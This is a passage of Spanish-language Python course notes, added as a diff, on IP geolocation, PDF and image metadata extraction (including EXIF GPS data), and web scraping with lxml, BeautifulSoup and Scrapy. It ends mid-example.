+			 - Obtener información de un dominio con el servicio domaintools utilizando el módulo requests y el parser lxml.html.
+
+			 - Utilizar el comando nslookup y el módulo DNSPython para obtener información de servidores DNS a través de los diferentes registros para consultar direcciones IP, servidores de correo y servidores de nombres utilizando el método dns.resolver.query('dominio', 'tipo_registro').
+
+			 - Por último, hemos utilizado el módulo dnspython para realizar diferentes operaciones como validar un dominio, obtener nombre de dominio a partir de la dirección ip y viceversa utilizando el submódulo dns.reversename.
+
+
+***********************************************************************************************************************************************************************
+
+	Unidad 5 -> Extracción de metadatos con Python
+
+		
+		5.1 Obtener información geográfica acerca de la localización de un servidor
+
+			- Revisamos cómo extraer información de geolocalización de una dirección IP o dominio.
+			- Una forma de obtener la geolocalización a partir una dirección IP o dominio es mediante un servicio. Ejemplo hackertarget.com -> https://hackertarget.com/geoip-ip-location-lookup
+			- Podríamos obtener la misma información en formato JSON con el servicio freegeoip -> https://ipbase.com/
+		
+		
+		5.2 Módulos de geolocalización en python
+
+			- Pygeoip es uno de los módulos disponibles en Python que le permite recuperar información geográfica a partir de una dirección IP.
+			- El módulo contiene varias funciones para recuperar datos. 
+			- Repositorio GitHub de pygeoip -> https://github.com/appliedsec/pygeoip
+			- Para construir el objeto usaremos la siguiente sentencia: (El método record_by_addr() nos devuelve información en formato diccionario que podemos recorrer con el métodos items())
+
+				 import pygeoip
+				 geolitecity = pygeoip.GeoIP('GeoLiteCity.dat')
+
+			- La salida del script anterior podria ser la siguiente:
+
+				dma_code-->807
+				area_code-->650
+				metro_code-->San Francisco, CA
+				postal_code-->94043
+				country_code-->US
+				country_code3-->USA
+				country_name-->United States
+				continent-->NA
+				region_code-->CA
+				city-->Mountain View
+				latitude-->37.41919999999999
+				longitude-->-122.0574
+				time_zone-->America/Los_Angeles
+
+
+			- Los métodos record_by_addr() y region_by_name() los podemos usar contra un archivo .dat para obtener los datos de geolocalizacion.
+			- Estos métodos nos permiten obtener, en forma de diccionario, una estructura con datos sobre el país, la ciudad, la latitud o la longitud.
+
+		
+			- La base de datos MaxMind contiene una serie de ficheros con los cuales obtener información de geolocalización.
+			- Enlaces:
+				- Sitio web Maxmind   -> https://www.maxmind.com/en/home
+				- Bases datos Maxmind -> https://dev.maxmind.com/geoip/geolite2-free-geolocation-data#Databases
+
+			- Dentro de los módulos de Python podemos encontrar los siguientes que están utilizando la base de datos MaxMind:
+				- geoip2: proporciona acceso a los servicios web y bases de datos GeoIP2. 				   Enlace -> https://github.com/maxmind/GeoIP2-python
+				- maxminddb-geolite2: proporciona una extensión para la base de datos MaxMindDB.           Enlace -> https://github.com/rr2do2/maxminddb-geolite2
+				- python-geoip-python3: proporciona acceso a los servicios web y bases de datos MaxMindDB. Enlace -> https://pypi.org/project/python-geoip-python3/
+
+			geoip2-python -> proporciona diferentes bases de datos dependiendo de los datos en los que estemos interesados. Se usa el metodo Reader() para mas informacion.
+
+				- NOTA: Para poder realizar la consulta con este módulo necesitamos que el fichero de base de datos se encuentre en la misma ruta que el script.
+
+					import geoip2.database
+					reader = geoip2.database.Reader('GeoLite2-City.mmdb')
+					response = reader.city('8.8.8.8')
+					print(response)
+
+
+			maxminddb-geolite2 -> es una biblioteca que proporciona acceso a las bases de datos GeoIP2 de MaxMind. Instalacion -> pip install maxminddb-geolite2
+
+				- Importamos la clase de geolite2
+				- Creamos una instancia con el metodo reader()
+				- Usaremos el metodo get() y le pasaremos una ip.
+
+						from geolite2 import geolite2
+						reader = geolite2.reader()
+						reader.get('8.8.8.8')
+
+
+			python-geoip-python3 -> es una biblioteca que proporciona acceso a las bases de datos GeoIP2 de MaxMind. Instalacion -> pip install python-geoip-python3
+
+				
+
+		5.3 Extracción de metadatos en documentos con el módulo PyPDF2
+
+			- Se puede instar directamente con el comando -> pip install pypdf2. Enlace: http://pypi.python.org/pypi/PyPDF2
+			- Si consultamos la ayuda del módulo, vemos que hay varias clases definidas, nosotros nos centraremos en la clase PdfFileReader.
+			- El metodo que vamos a usar para obtener la información de un documento PDF es getDocumentInfo().
+			- Para almacenar los metadatos, los ficheros PDF usan Extensible Metadata Platform (XMP)
+			- XMP se crea en XML, lo que facilita el intercambio de metadatos entre diversas aplicaciones.
+			- El módulo pypdf2 proporciona el método getXmpMetadata() para obtener otra información relacionada con el documento, como los creadores, el editor y la versión en pdf.
+			- El metodo "walk" del modulo os, es utils para recorrer todos los ficheros y directorios que se encuentran en un directorio en específico.
+			- Con el método hasattr(), comprobamos si una determinada propiedad se encuentra dentro del objeto xmpinfo, antes de acceder a esa informacion.
+		
+			- Con pdfimages, es solo para linux. Enlace -> https://manpages.ubuntu.com/manpages/focal/man1/pdfimages.1.html. $ apt-get install poppler-utils
+			
+			- Pdfimages permite extraer imágenes de documentos PDF en sistemas operativos Linux / UNIX. y guarda imágenes en formatos como Portable Pixmap (PPM), Portable Bitmap (PBM) o archivos JPEG.
+			- Para cada imagen que detecta en el documento crear un fichero con el formato nnn.xxx, donde nnn es el número de imagen y xxx es el tipo de imagen (. ppm, .pbm, .jpg).
+			- Para su ejecucion -> $ pdfimages pdf/TutorialPython3.pdf ./imagenes
+
+			- La otra alternativa es un modulo de python: pymupdf.
+			- Respositorio GitHub: https://github.com/pymupdf/PyMuPDF
+			- Instalacion en Ubuntu: https://github.com/pymupdf/PyMuPDF/wiki/Ubuntu-Installation%20Experience
+
+			- Instalacion:
+				sudo apt install python3-pip
+				sudo -H pip3 install --upgrade pip
+				sudo -H python3.6 -m pip install -U pymupdf
+
+			- La forma de usar este módulo es usando la clase fitz que dispone de métodos para abrir el fichero y extraer las imágenes en formato PNG.
+
+			- Peepdf es una herramienta de Python que analiza archivos PDF y nos permite visualizar todos los objetos incrustados en el documento.
+			- También tiene la capacidad de analizar diferentes versiones de un archivo PDF, secuencias de objetos y archivos cifrados, así como modificar y ofuscar archivos PDF.
+			- Descarga peepdf: https://eternal-todo.com/tools/peepdf-pdf-analysis-tool
+			- Ejecutar el archivo py y pasarle como parametro el PDF:
+
+				File: TutorialPython3.pdf
+				MD5: 858dfc990a4c90a5045092bc453c8746
+				SHA1: 0dff694d630cffe97aeb7d1f2e1f064d434d4b3e
+				Size: 2657251 bytes
+				Version: 1.4
+				Binary: True
+				Linearized: False
+				Encrypted: False
+				Updates: 0
+				Objects: 2539
+				Streams: 727
+				Comments: 0
+				Errors: 0
+
+
+		5.4 Extracción de metadatos en imágenes
+
+			- Exiftool: https://exiftool.org/ official page
+			- Se trata de una aplicación de código abierto que permite leer, escribir y manipular metadatos de imágenes, audio y video.
+			- Visualizar los metadatos de una gran cantidad de formatos de imágenes, como AWR, ASF, SVG, TIFF, BMP, CRW, PSD, GIF, XMP, JP2, JPEG, DNG y unos cuantos más.
+			- Formatos de metadatos soportados podemos mencionar el EXIF, GPS, IPTC, XMP, Kodak, Rico, Adobe, Vorbis, JPEG 2000, Ducky, QuickTime, Matroska y DjVu entre otros.
+			- Instalacion: $ sudo apt-get install libimage-exiftool-perl
+			- Ejecucion: $ exiftool images/image.jpg
+
+
+		5.5 Extracción de metadatos con el módulo PIL.ExifTags
+
+			- Principal módulo que encontramos dentro de Python para el procesamiento y manipulación de imágenes es: PIL.
+			- Permite extraer los metadatos de imágenes en formato EXIF. Exif(Exchange Image File Format)
+			- El módulo PIL.ExifTags permite extraer la información de estas etiquetas.
+			- ExifTags contiene una estructura de diccionario con constantes y nombres para muchas etiquetas EXIF conocidas.
+			- Documentación del módulo exiftags: https://pillow.readthedocs.io/en/latest/reference/ExifTags.html
+			- Dos clases con las que trabajar:
+				- PIL.ExifTags.TAGS    -> Permite extraer la etiquetas más comunes almacenadas en la imagen.
+				- PIL.ExifTags.GPSTAGS -> Permite extraer las etiquetas relacionadas con información de geolocalización.
+
+
+		5.6 Obtener los metadatos EXIF de una imagen
+
+			- Primero importamos los módulos PIL y PIL.ExifTags. PIL es un módulo de procesamiento de imágenes en Python que soporta diferentes formatos de archivo y tiene una poderosa capacidad de procesamiento de imágenes.
+			- Para obtener la información de EXIF tags de una imagen se puede utilizar el método _getexif() del objeto imagen.
+			- El método anterior nos devuelve una estructura tipo diccionario el cual podemos recorrer.
+		
+		5.7 Obteniendo geolocalización
+
+			- En el ejemplo anterior vemos que hemos obtenido también información en el objeto GPSInfo.
+			- Esta información se puede mejorar descodificando la información que hemos obtenido en un formato de valores latitud/longitud.
+			- A traves del modulo GPSInfo podemos parsear la informacion.
+
+		5.8 Extraer metadatos de imágenes web
+
+			- Con un script en pytho podemos conectarnos a un sitio web, descargar todas las imágenes y verificar si hay metadatos EXIF.
+			- Para eso usaremos el modulo urllib de python3 que contiene los paquetes de parse y request.
+			- Con el modulo BeautifulSoup, podemos descargar las imagenes en una carpeta.
+			- El método findImages(url) permite obtenerlas imágenes de un sitio.
+			- BeautifulSoup, realiza la petición y parsea el contenido html para obtener las imágenes.
+			- El método downloadImage(imgTag,url) permite descargar la imagen en el directorio de images.
+
+		
+		RESUMEN:
+
+			- Extraer información de geolocalización de una dirección IP o dominio con los servicios hackertarget.com y freegeoip
+
+			- Analizamos los diferentes módulos de geolocalización en python como pygeoip,geoip2,maxminddb-geolite2,python-geoip-python3. Algunos de estos módulos usan la base de datos de MaxMInd que contiene una serie de ficheros con los cuales obtener información de geolocalización.
+
+			- Extraer metadatos en documentos PDF con el módulo PyPDF2. El módulo PyPDF2 proporciona la clase PdfFileReader y los métodos getDocumentInfo(), getXmpMetadata() para obtener otra información relacionada con el documento, como los creadores, el editor y la versión en pdf. 
+
+			- Extraer imágenes de documentos PDF con herramientas como Pdfimages y el módulo pymupdf
+
+			- Extraer metadatos de imágenes con la herramienta exiftool y el módulo de python PIL.ExifTags. La clase PIL.ExifTags.TAGS permite extraer la etiquetas más comunes almacenadas en la imagen y PIL.ExifTags.GPSTAGS permite extraer las etiquetas relacionadas con información de geolocalización.
+
+			- Obtener información sobre geolocalización de imágenes gracias al uso del objeto GPSInfo
+
+
+***********************************************************************************************************************************************************************
+
+	Unidad 6 -> Web Scraping con Python
+	
+			6.1 Extracción de contenidos web con Python
+			
+				- Diferentes tecnicas para extraer contenido de las páginas web:
+				
+					- Screen scraping -> Técnica que permite obtener información moviéndote por la pantalla.
+					- Web scraping    -> Trata es obtener la información de un recurso como por ejemplo de una página web en HTML y procesa esa información para extraer datos relevantes.
+					- Report mining   -> Técnica que permite extraer informacion de archivos. No es necesario el uso de API y ni de tener conexio. Es offline.
+					- Spider          -> Es un script que pretende imitar el comportamiento de un usauaro en una web. La idea es solo escrirbir las reglas necesario y que el script recopile toda la informacion.
+					
+				- En esta unidad nos vamos a centrar en el web scraping.
+				
+				- En esta unidad revisaremos el módulo lxml junto con los parsers xml, html y el módulo BeautifulSoup.
+				
+			6.2 Parsers XML y HTML
+			
+				- El módulo lxml es un módulo que une las librerías libxml2 para análisis de documentos XML y libxslt.
+				
+					- Caracteristicas: (DOCUMENTACION -> https://lxml.de/) Se puede instar este módulo con: pip install lxml
+					    - Soporte para documentos XML y HTML.
+						- Dispone de una API basada en "ElementTree".
+						- Soporte para seleccionar elementos del documento mediante expresiones XPath.
+				- Como primer ejemplo usaremos el submodulo lxml.etree el cual proporciona un metodo XPath(), el cual soporta extensiones utilizando como sintaxis selectores XPath.
+
+				
+			6.3 Submódulo lxml.html
+
+				- El módulo lxml también provee un submódulo de Python llamado lxml.html dedicado para trabajar con HTML
+				- DOCUMENTACION -> https://lxml.de/lxmlhtml.html
+				
+			6.4 Extraer etiquetas de un sitio web con el módulo lxml
+			
+				- Antes de analizar, hay que obtener el contenido que vamos a analizar.
+				- Como pequeño ejemplo tenemos esta URL -> https://www.debian.org/releases/stable/index.en.html (DEBIAN RELEASE)
+				- Vamos a obtener la version y el nombre en clave de la ultima verion estable de Debian.
+				- La información que queremos se muestra en el título de la página y en el primer párrafo.
+				- CODIGO:
+				
+				     import requests # Con el modulo requests descargamos la página
+					 response = requests.get('https://www.debian.org/releases/stable/index.en.html')
+					 
+					 from lxml.etree import HTML # Analizamos el código fuente con un arbol ElementTree
+					 root = HTML(response.content)	# Usamos el parse HTML que tiene la libreria lxml.
+					 
+					 # La funcion anterior HTML es un acceso directo que lee el codigo HTML y produce un arbol XML como respuesta.
+					 [e.tag for e in root] # Produce esta salida ['head', 'body']
+					 
+					 # Si nos interesa el contenido de texto del elemento <title&gt; del documento html, podríamos hacerlo de la siguiente forma
+					 root.find('head').find('title').text # Su salida por pantalla es: 'Debian -- Debian "stretch" Release Information '
+					 
+			 
+				- Para obtener formulario hay que acceder al objeto forms que estará contenido dentro de la respuesta de la url.
+				
+				
+			6.5 Expresiones xpath
+			
+				- Con el objetivo de optimizar la comprobación de los elementos html, necesitamos usar XPath, que es un lenguaje de consulta que se desarrolló específicamente para XML.
+				- Con la shell de python se podria hacer esto de manera sencilla: root.xpath('body') # Como resultado [<Element body at 0x4477530>]
+				- Lo que hace es buscar hijos del elemento actual que tienen nombres de etiquetas que coinciden con el nombre de la etiqueta especificada.
+				- El elemento actual es el que llamamos xpath(), en este caso, root.
+				
+				- El elemento raíz es el elemento <html&gt; de nivel superior en el documento HTML, por lo que el elemento devuelto es el elemento <body&gt;.
+				- Por ejemplo, podemos usar expresiones xpath para encontrar solo los elementos secundarios <div&gt; dentro de <body&gt;
+				- Shell python: root.xpath('body/div') # Da como resultado [<Element div at 0x447a1e8>, <Element div at 0x447a210>, <Element div at 0x447a238>]
+				
+				- Podemos forzar una búsqueda desde la raíz del árbol añadiendo una barra diagonal al comienzo de la expresión. 
+				- Shell python: root.xpath('//h1') # Salida -> [<Element h1 at 0x447aa58>]
+				
+				- Los corchetes después de div, [@id = "content"], forman una condición que colocamos en los elementos <div&gt;.
+				- El signo @ antes de la palabra clave id significa que id se refiere a un atributo.
+				- La condición significa: obtener aquellos elementos cuyo atributo id sea igual a "content".
+				
+				- Podemos especificar solo un nombre de etiqueta: root.xpath('//div[h1]') # Respuesta -> [<Element div at 0x3d6d800>]
+				
+				- Para acceder al segundo elemento. 
+				- Shell python: root.xpath('body/div[2]') # Respuesta: [<Element div at 0x3d6d800>]
+				- Hay que tener en cuenta que estos índices comienzan en 1, a diferencia de la indexación de Python que comienza en 0.
+				
+				DOCUMENTACION -> https://www.w3.org/TR/xpath-3/
+				
+			
+			6.6 Extracción de enlaces con el módulo lxml con expresiones xpath
+			
+				- Una de las principales funcionalidades que podríamos desarrollar es la extracción de diferentes elementos html.
+				- Podríamos definir una clase llamada Scraping y definir un método por cada tipo de recurso a extraer.
+				- En este caso estamos utilizando el parser xml y expresiones regulares del tipo xpath para obtener cada uno de los recursos a extraer.
+				- Para el caso de extraer enlaces a partir de una url podemos hacer uso de la expresión xpath //a/@href.
+				- Esto nos devolverá el valor del atributo href para todos aquellos elementos correspondientes a un enlace html.
+			
+			
+			6.7 Extracción de documentos pdf con el módulo lxml con expresiones xpath
+			
+				- Para el caso de extraer documentos pdf a partir de una url podemos hacer uso de la expresión -> xpath //a[@href[contains(., ".pdf")]]/@href
+				- Esto nos devolverá el valor de atributo href para todos aquellos elementos correspondientes a un documento pdf.
+				
+				
+			6.8 Extraer contenido y etiquetas con BeautifulSoup
+			
+				- BeautifulSoup es una librería utilizada para realizar operaciones web de scraping desde Python.
+				- Se enfoca en el parseo de contenidos web como XML, HTML, JSON.
+				
+				- No está pensada directamente para scraping web.
+				- El objetivo de esta herramienta es ofrecer una interfaz que permita acceder de una manera sencilla al contenido de una página web.
+				- La hace ideal para extraer información de la web.
+				
+				- Principales caracteristicas:
+				
+					    - Parsea y permite extraer información de documentos HTML.
+						- Soporta múltiples parsers para tratar documentos XML, HTML(lxml, html5lib).
+						- Genera una estructura de árbol con todos los elementos del documento parseado.
+						- Permite buscar de una forma sencilla elementos HTML, tales como enlaces, formularios o cualquier etiqueta HTML.
+						
+				- Repositorio oficial (DOCUMENTACION): https://www.crummy.com/software/BeautifulSoup/
+				- Instalacion: pip install BeautifulSoup4
+				- Una vez instalado, el nombre del paquete es bs4. # from bs4 import BeautifulSoup #
+				
+				- Para poder realizar operaciones con un documento HTML, es necesario crear un objeto a partir de la clase bs4.BeautifulSoup ingresando un objeto de tipo str que contenga el código HTML.
+				- Hay que seleccionar el tipo de analizador que se va a usar.
+				- Ej: bs4.BeautifulSoup (<tipo de objeto str&gt;, <tipo de analizador&gt;)
+				
+				- Para crear una instancia de BeautifulSoup es necesario pasar por parámetros el contenido del documento HTML y el parser que queramos utilizar (lxml, html5lib):
+				- Shell python: bs= BeautifulSoup(contents,"lxml") # En bs tenemos todo el documento y podemos navegar por el.
+				- Si queremos acceder a la etiqueta title del documento, podríamos acceder mediante bs.title
+				
+			6.9 Método find_all() de BeautifulSoup
+			
+				- Una característica interesante de la librería es que permite buscar elementos concretos en la estructura del documento.
+				- bs.find_all(patron_busqueda) -> Este método nos permite encontrar todos los elementos HTML de un tipo determinado y nos devuelve una lista de tags que coincidan con el patrón de búsqueda.
+				- Ej: buscar todas las etiquetas meta de un documento HTML 
+				
+					     meta_tags = bs.find_all("meta")
+						 for tag in meta_tags:
+							print(tag)
+							
+				- Para buscar todos los formularios de un documento HTML
+				
+						 form_tags = bs.find_all("form")
+						 for form in form_tags:
+							print(form)
+							
+				- Para buscar todos los enlaces de un documento HTML:
+				
+						     link_tags = bs.find_all("a")
+							 for link in link_tags:
+								print(link)
+				
+				- Podemos usar el paquete re para identificar patrones comunes como correos electrónicos y URLs.
+				- Podemos especificar patrones de expresión regular para que coincidan con etiquetas específicas.
+				- Sería interesante añadir un tratamiento de excepciones y verificar si al intentar obtener una etiqueta dentro del código html.
+				- Si una determinada etiqueta no existe devolverá el objeto None, lo que facilitará este tipo de casos.
+				
+				
+			6.10 Extracción de imágenes y enlaces con el módulo bs4
+			
+				- De la misma forma que en la sección anterior hemos extraído las enlaces, documentos e imágenes con el módulo de lxml, también podemos hacerlo directamente con BeautifulSoup.
+				- PASOS A SEGUIR:
+					- Realizamos una peticion a una URL pasada por parámetro con el módulo requests.
+					- Construimos el objeto BeautifulSoup a partir del cual vamos a extraer aquellas etiquetas que sean <img&gt;
+					- Si la url es correcta, se descarga la imagen de nuevo utilizando el módulo requests.
+					- Para el caso de extraer imágenes a partir de una url podemos hacer uso del método bs.find_all("img")
+					
+
+
+				RESUMEN:
+				
+				    - Las diferentes técnicas que disponemos para extraer contenidos de la web.
+
+					- Extraer información de un sitio web mediante los parsers lxml y beautifulSoup.
+
+					- Extraer información usando los módulos lxml.etree y lxml.html que se tratan submódulos dentro de la librería lxml,
+
+					- Extraer información mediante el uso de expresiones XPath.
+
+					- Extraer contenido y etiquetas con BeautifulSoup.
+
+					- Obtener el código HTML de un sitio web y crear un objeto BeautifulSoup mediante bs4.BeautifulSoup (<codigo_html&gt;, <tipo de analizador&gt;)
+
+					- Encontrar todos los elementos HTML de un tipo determinado utilizando el método bs.find_all(patron_busqueda).
+					
+					- Extraer etiquetas meta y de contenido mediante expresiones regulares.
+					
+					- Extraer enlaces e imágenes de una url con BeautifulSoup.
+					
+					- Implementar un crawler de enlaces mediante BeautifulSoup.
+
+
+***********************************************************************************************************************************************************************
+
+	Unidad 7 -> Web Scraping avanzado con Scrapy
+
+		7.1 Arquitectura e instalación de Scrapy
+
+			- Scrapy es un framework para Python que permite realizar tareas de webscraping y procesos de web crawling y análisis de datos.
+			- Web oficial del proyecto : https://scrapy.org
+			- Scrapy tiene las siguientes características:
+				- Rápido y robusto 		-> podemos escribir las reglas para extraer los datos y Scrapy hace el trabajo por nosotros.
+				- Fácilmente extensible -> dada su configuración, podemos generar una nueva funcionalidad sin tener que modificar el código fuente.
+				- Multiplataforma 		-> está escrito en Python y puede ejecutarse en Linux, Windows, Mac y BSD.
+
+			- Scrapy tiene una serie de herramientas con el objetivo de scrapear o extraer información de sitios web de manera fácil y eficiente.
+			- Estas herramientas incluyen lo siguiente:
+				- Soporte para extraer y seleccionar datos de fuentes HTML/XML usando selectores CSS y expresiones XPath, con métodos para extraer usando expresiones regulares.
+				- Una consola interactiva en IPython para probar expresiones CSS y XPath para extraer datos, lo cual es muy útil al crear sus propios métodos.
+				- Soporte para exportar registros en múltiples formatos como JSON, CSV y XML.
+				- Gran extensibilidad, ya que le permite conectar su propia funcionalidad utilizando señales, extensiones y pipelines.
+
+			Recuerda:
+
+				- Los web crawlers son robots que recorren sitios web, 
+				partiendo de una lista de urls y van siguiendo los links encontrados y descargando las páginas para su posterior procesamiento.
+				- Los web scrapers son utilizados para extraer datos estructurados (ej: diccionarios) a partir de contenido no estructurado, o semiestructurado (HTML)
+
+			- Scrapy permite escanear de forma recursiva los contenidos de un sitio web y aplicar un conjunto de reglas sobre dichos contenidos para extraer información.
+			- Estos son los principales elementos de la arquitectura:
+				- Motor de scrapy (engine) -> El motor gestiona las peticiones y el flujo de datos entre todos los demás componentes.
+				- Planificador (planner) -> El planificador recibe las peticiones enviadas por el motor y las pone en cola.
+				- Downloader -> El propósito del downloader es buscar todas las páginas web y enviarlas al motor. El motor posteriormente envía las páginas web a los spyders.
+				- Spiders(arañas) -> Rutinas de código que se encargan de realizar peticiones HTTP a un listado de dominios dados por el cliente y 
+				de aplicar reglas en forma de expresiones regulares o XPATH sobre el contenido retornado de las peticiones HTTP.
+				- Expresiones XPath -> Con las expresiones XPath podemos llegar a un nivel bastante detallado de la información que queremos extraer.
+				- Ítems -> Los ítems son como contenedores de información ya que permiten 
+				almacenar la información que retornan las reglas que aplicamos sobre los contenidos que vamos obteniendo.
+				- Ítem pipelines -> Son elementos que procesan los ítems una vez estos han sido analizados por el spyder.
+				- Arquitectura de scrapy -> https://doc.scrapy.org/en/latest/topics/architecture.html#topics-architecture
+
+			- Instalación de scrapy: https://doc.scrapy.org/en/latest/intro/install.html#intro-install
+			- Documentación de scrapy: https://doc.scrapy.org/en/latest/
+			- Scrapy se creó a partir de Twisted, por lo que es capaz de realizar diversas peticiones de forma simultánea. https://twisted.org
+			- Se puede intalar mediante: pip install scrapy. Enlace: https://anaconda.org/anaconda/scrapy
+
+
+		7.2 Extrayendo información mediante scrapy shell
+
+			- Scrapy Shell es una herramienta de línea de comandos que permite a los desarrolladores realizar pruebas de extracción de datos sobre una determinada url.
+			DOCUMENTACION: https://docs.scrapy.org/en/latest/topics/shell.html
+			- Un ejemplo de uso:
+				- Abrimos una sesion interactivo con scrapy shell.
+				- Luego usamos fetch para realizar una petición HTTP a una url pasada por parámetro y transferir los resultados con el objeto de response.
+				- si queremos extraer el texto correspondiente al título de la página, podemos hacer con la expresión xpath '//title/text()'
+				Proceso:
+
+				fetch('http://www.scrapy.org')
+				response.xpath('//title/text()').extract()
+
+		
+		7.3 Uso de selectores
+
+			- Podemos usar los selectores para seleccionar algunas partes de los datos HTML obtenidos.
+			-  Los selectores permiten seleccionar datos HTML usando expresiones XPath y CSS a través de response.xpath() y response.css().
+			
+					from scrapy.selector import Selector
+					body = '<html&gt;<body&gt;<h1>Extract data with selectorh1></body&gt;</html&gt;'
+					Selector(text = body).xpath('//h1/text()').get()
+					"Extract data with selector"
+
+			DOCUMENTACION: https://docs.scrapy.org/en/latest/topics/selectors.html
+
+
+		7.4 Scrapy como framework de desarrollo de spyders
+
+			- En esta sección exploraremos Scrapy como un framework de desarrollo para Python que nos permite:
+				- Realizar tareas de web scraping.
+				- Procesos de rastreo web.
+				- Análisis de datos.
+			- Explicaremos la estructura que presenta un proyecto Scrapy y cómo crear nuestro propio proyecto.
+			- Crearemos un spyder para rastrear una página web y extraer los datos que nos interesan.
+			- Revisaremos los componentes Scrapy, creando un proyecto para configurar diferentes pipelines.
+			- Una de las principales ventajas de Scrapy es que está construido sobre Twisted, un framework de red asincrónico y sin bloqueo para tareas de concurrencia.
+			- "Sin bloqueo" significa que no tiene que esperar a que finalice una solicitud antes de hacer otra, incluso puede lograrlo con un alto nivel de rendimiento.
+			- Entre las principales ventajas de usar scrapy podemos destacar:
+				- Menos uso de CPU y menos consumo de memoria.
+				- Muy eficiente en comparación con otros frameworks y librerías.
+				- La arquitectura diseñada le ofrece robustez y flexibilidad.
+				- Puede desarrollar fácilmente middleware personalizado para añadir funcionalidades personalizadas.
+
+
+		7.5 Creación de un proyecto scrapy
+
+			- Para crear un proyecto con scrapy hay que ejecutar desde la consola el siguiente comando: scrapy startproject <nombre_proyecto&gt;
+			- generará la siguiente estructura de carpetas y ficheros donde podemos ver los principales componentes de un proyecto scrapy.
+			
+			ESTRUCTURA:
+
+				nombre_proyecto
+				scrapy.cfg #fichero de configuracion
+				project_name /
+				__init__.py
+				items.py #Definicion de los items
+				pipelines.py #configurar pipelines
+				settings.py #configuración de los spiders
+				spiders #directorio donde se guardan los spiders
+						__init__.py
+
+			- Cada proyecto se compone de los siguientes ficheros:
+				- items.py 	   -> Definimos los elementos a extraer y creamos los campos de la información que vamos a extraer.
+				- spiders  	   -> Es el corazón del proyecto, aquí definimos el procedimiento de extracción. Scrapy internamente lo que hace es buscar clases del tipo Spyder 
+				ubicadas en la carpeta de spiders y usará la configuración que encontramos en el archivo settings.py.
+				- pipelines.py -> Son los elementos para analizar lo obtenido: validación de datos, limpieza del código HTML. Se usa para recibir un elemento y 
+				realizar una acción sobre él.
+
+				- Tenemos que definir los elementos que queremos extraer, o más bien la clase donde se almacenarán los datos extraídos por scrapy.
+				- El siguiente código sería un ejemplo de fichero items.py donde definimos una clase que hereda de la clase scrapy.Item.
+				- En esta clase básicamente tenemos que definir los campos(fields) de la información que queremos extraer(título,descripción,url,precio..):
+				
+						from scrapy.item import Item, Field
+						class MyItem(Item):
+						name = Field()
+
+				- Scrapy proporciona la clase Item para definir el formato de datos de salida.
+				- Los objetos Item son contenedores que se utilizan para recopilar los datos extraídos.
+				- Especifican metadatos para el campo utilizado para caracterizar esos datos.
+				- Estos objetos proporcionan una sintaxis para declarar campos donde el objeto Field especifica los metadatos para cada campo.
+				- DOCUMENTACION: https://doc.scrapy.org/en/latest/topics/items.html 
+
+
+		7.6 Spyders
+
+			- Scrapy usa los spyders para definir cómo se debe scrapear un sitio para obtener información.
+			- Scrapy nos permite determinar qué información queremos extraer y cómo podemos extraerla.
+			- Específicamente, las spyders son clases de Python donde pondremos toda nuestra lógica y comportamiento personalizados.
+			- Spiders en scrapy: https://docs.scrapy.org/en/latest/topics/spiders.html
+
+			- El ciclo que sigue un spyder es el siguiente:
+				- Primero empezamos generando la petición inicial (Requests) para navegar por la primera URL y especificamos la función parse_item() 
+				que será llamada con la respuesta (Response) descargada de esa petición.
+				- La primera petición a hacer es obtenida llamando al método start_request() que por defecto genera la petición para la URL específica 
+				en las direcciones de inicio "start_urls" y la función parse_item() para las peticiones.
+				- En esta función analizamos el contenido usando los selectores (XPath Selectors) y generamos los Items con el contenido analizado.
+				- Finalmente, los Items devueltos por el spyder se podrán pasar a algún Item Pipeline.
+				
+			- En la función de parse_item() analizamos la respuesta y se puede devolver:
+				- Objetos tipo Item.
+				- Objetos tipo Request.
+				- Una unión de ambos sobre la que se puede iterar.
+
+			- Esta podría ser la estructura base de nuestro spider donde definimos el nombre del spyder y el dominio del cual queremos extraer información.
+
+					from scrapy.contrib.spiders import CrawlSpider
+		
+					class MySpider(CrawlSpider):
+						name = 'myspider'
+						allowed_domains = ['dominio.com']
+
+			- En primera instancia realizamos los imports de las clases necesarias para llevar a cabo el proceso de crawling. 
+			- Entre estas clases podemos destacar:
+				- Rule -> Nos permite establecer las reglas por las cuales el crawler se va a basar para navegar por los diferentes enlaces.
+				- LxmlLinkExtractor -> Nos permite definir una función de callback y expresiones regulares para indicarle al crawler por los enlaces que debe pasar.
+				- HtmlXPathSelector -> Permite aplicar expresiones XPath.
+				- CrawlSpider -> provee un mecanismo que permite seguir los enlaces que siguen un determinado patrón. 
+
+		
+		7.7 Extracción de enlaces con scrapy
+
+			- El primer paso es crear el spyder. Scrapy proporciona el comando genspider para generar la plantilla.
+			Comando -> scrapy genspider <nombre_proyecto> <webscraping>
+			Web a scrapear -> http://books.toscrape.com
+			- Al heredar de scrapy.spider.Spider se proporcionan los siguientes métodos:
+				- start_requests() -> Para cada url definida se crea un objeto request de scrapy, asignando los parámetros necesarios para que el motor use la conexión correcta.
+				- parse(response) -> Scrapy llama a este método cuando obtiene un objeto de respuesta HTTP al completar con éxito una descarga de contenido.
+				Documentación método parse: https://doc.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.parse
+
+				- name 			  -> Es el nombre de la araña que se dio en el comando de generación.
+				- allowed_domains -> Es una lista de los dominios permitidos que la araña puede rastrear.
+				- start_urls 	  -> Es la URL desde donde comenzará el proceso de scraping.
+				- parse() 		  -> Es la función que permite analizar la respuesta, extraer los datos y obtener nuevas URLs.
+
+				Su ejecucion: scrapy runspider BooksSpider.py -o books_links.json -t json
+
+		
+		7.8 Scrapy pipelines
+
+			- Los pipelines son elementos de Scrapy a los que la información que les llega son Items que han sido previamente obtenidos y procesados por algún Spider.
+			- Los usos típicos de los pipelines son:
+				- Limpieza de datos en HTML.
+				- Validación de datos scrapeados comprobando que los items contienen ciertos campos.
+				- Comprobación de items duplicados.
+				- Almacenamiento de los datos extraídos en una base de datos.
+
+
+			Documentación item-pipeline: https://doc.scrapy.org/en/latest/topics/item-pipeline.html
+			- Una pipeline de elementos es una clase de Python que sobrescribe algunos métodos específicos y debe activarse en la configuración del proyecto Scrapy.
+			- Al crear un proyecto Scrapy, encontrará un archivo pipelines.py ya disponible para crear sus propios pipelines.
+			- Estos objetos son clases de Python que deben implementar el método process_item(item, spider).
+			- Deven devolver, o un objeto tipo item (o una subclase de este) o, sino devuelven nada, lanzar un excepcionde tipo Dropitem para indicar que ese Item no seguirá siendo procesado.
+
+			EJEMPLO:
+
+			#!/usr/bin/python
+			from scrapy.exceptions import DropItem
+			class MyPipeline(object):
+				def process_item(self, item, spider):
+					if item['key']:
+						return item
+					else:
